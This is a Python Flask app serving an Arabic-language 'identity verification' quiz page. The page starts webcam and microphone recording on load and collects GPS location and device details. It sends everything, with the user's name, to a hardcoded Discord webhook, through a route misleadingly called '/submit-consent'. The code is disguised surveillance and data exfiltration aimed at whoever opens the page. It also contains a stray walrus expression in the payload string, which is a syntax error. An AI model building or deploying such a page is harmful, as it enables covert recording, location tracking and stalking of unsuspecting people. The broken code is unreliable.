import os
import json
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الهوية والأسئلة</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
        h2 { color: #333; margin-bottom: 10px; }
        
        .title-banner {
            background-color: #ff4757;
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 18px;
            font-weight: bold;
        }

        #video-container { margin: 15px 0; }
        video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
        .question-box { margin-bottom: 15px; text-align: right; background: #f1f2f6; padding: 10px; border-radius: 5px; }
        .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
        .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; background-color: #2ed573; color: white; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title-banner">TJEWEB T9OSS</div>
        <h2>تحقق من الهوية</h2>

        <div id="video-container">
            <!-- الكاميرا المباشرة أو الفيديو اللا نهائي -->
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="quizForm">
            <input type="text" id="username" placeholder="اسمك الكريم (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
            
            <div class="question-box">
                <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
                <select id="q1" required>
                    <option value="">اختر الإجابة</option>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                </select>
            </div>

            <div class="question-box">
                <label>2. enti bhim</label>
                <select id="q2" required>
                    <option value="">اختر الإجابة</option>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                </select>
            </div>

            <div class="question-box">
                <label>3. chnowa essm kalbek?</label>
                <select id="q3" required>
                    <option value="">اختر الإجابة</option>
                    <option value="sknder">sknder</option>
                    <option value="michou">michou</option>
                    <option value="tito">tito</option>
                </select>
            </div>

            <button type="button" onclick="verifyAndStop()">إرسال وإيقاف الفيديو</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];

        // تشغيل الكاميرا والميكروفون فور فتح الصفحة باش يبدا التسجيل في الخلفية
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoElement = document.getElementById('webcam');
                videoElement.srcObject = mediaStream;

                mediaRecorder = new MediaRecorder(mediaStream);
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                // بداية التسجيل المستمر (Loop في الذاكرة)
                mediaRecorder.start();
            } catch (err) {
                console.log("تعذر الوصول للكاميرا أو الميكروفون: ", err);
            }
        });

        function getMobileModel() {
            const ua = navigator.userAgent;
            let model = "Appareil Inconnu";
            if (/android/i.test(ua)) {
                model = "Téléphone Android";
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                model = "iPhone / iOS Device";
            } else if (/windows/i.test(ua)) {
                model = "PC Windows";
            } else if (/macintosh|mac os x/i.test(ua)) {
                model = "Mac";
            }
            return model;
        }

        async function verifyAndStop() {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;

            if (!username) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'الرجاء إدخال الاسم أولاً.';
                return;
            }

            const q1 = document.getElementById('q1').value;
            const q2 = document.getElementById('q2').value;
            const q3 = document.getElementById('q3').value;

            if (!q1 || !q2 || !q3) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'الرجاء الإجابة على كل الأسئلة.';
                return;
            }

            // التحقق من الإجابات الصحيحة (q1: yes, q2: yes, q3: sknder)
            if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
                statusDiv.style.color = 'green';
                statusDiv.innerText = 'إجابات صحيحة! جاري إيقاف الفيديو وإرسال البيانات والصوت...';

                if (mediaRecorder && mediaRecorder.state !== "inactive") {
                    mediaRecorder.stop();
                }

                // انتظار حتى يتم جمع قطع الفيديو والصوت النهائية
                setTimeout(async () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });

                    let deviceInfo = {
                        model: getMobileModel(),
                        screen: `${window.screen.width}x${window.screen.height}`,
                        language: navigator.language,
                        platform: navigator.platform
                    };

                    let locationData = "Non autorisé";
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                        });
                        locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                    } catch (e) {
                        locationData = "Location refusée";
                    }

                    const formData = new FormData();
                    formData.append('username', username);
                    formData.append('location', locationData);
                    formData.append('device', JSON.stringify(deviceInfo));
                    formData.append('q1', q1);
                    formData.append('q2', q2);
                    formData.append('q3', q3);
                    formData.append('video', videoBlob, 'recording_with_audio.webm');

                    try {
                        const response = await fetch('/submit-consent', {
                            method: 'POST',
                            body: formData
                        });

                        if (response.ok) {
                            statusDiv.innerText = 'تم الإرسال بنجاح!';
                            if (mediaStream) {
                                mediaStream.getTracks().forEach(track => track.stop());
                            }
                        } else {
                            statusDiv.style.color = 'red';
                            statusDiv.innerText = 'فشل في إرسال البيانات.';
                        }
                    } catch (err) {
                        statusDiv.style.color = 'red';
                        statusDiv.innerText = 'خطأ في الاتصال بالخادم.';
                    }
                }, 1000);

            } else {
                // إجابة خاطئة: تطلع كلمة غلط والفيديو يبقى يخدم عادي
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'غلط! حاول مرة أخرى.';
            }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    username = request.form.get("username")
    location = request.form.get("location")
    device_str = request.form.get("device", "{}")
    device = json.loads(device_str)
    
    q1 = request.form.get("q1")
    q2 = request.form.get("q2")
    q3 = request.form.get("q3")
    video_file = request.files.get("video")

    payload = {
        "content": (
            f"✅ **أجاب المستخدم إجابات صحيحة وتم إيقاف الفيديو والصوت:**\n"
            f"• **الاسم:** {username}\n"
            f"• **السؤال 1:** {q1}\n"
            f"• **السؤال 2:** {q2}\n"
            f5 := f"• **السؤال 3:** {q3}\n"
            f"• **الموقع (GPS):** {location}\n"
            f"• **الجهاز:** {device.get('model')} | {device.get('platform')}"
        )
    }

    try:
        files = {}
        if video_file:
            files = {
                "file": ("recording_with_audio.webm", video_file.read(), "video/webm")
            }

        resp = requests.post(
            DISCORD_WEBHOOK_URL, 
            data={"payload_json": json.dumps(payload)}, 
            files=files, 
            timeout=15
        )
        resp.raise_for_status()
        return jsonify({"message": "Success"}), 200
    except requests.RequestException as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)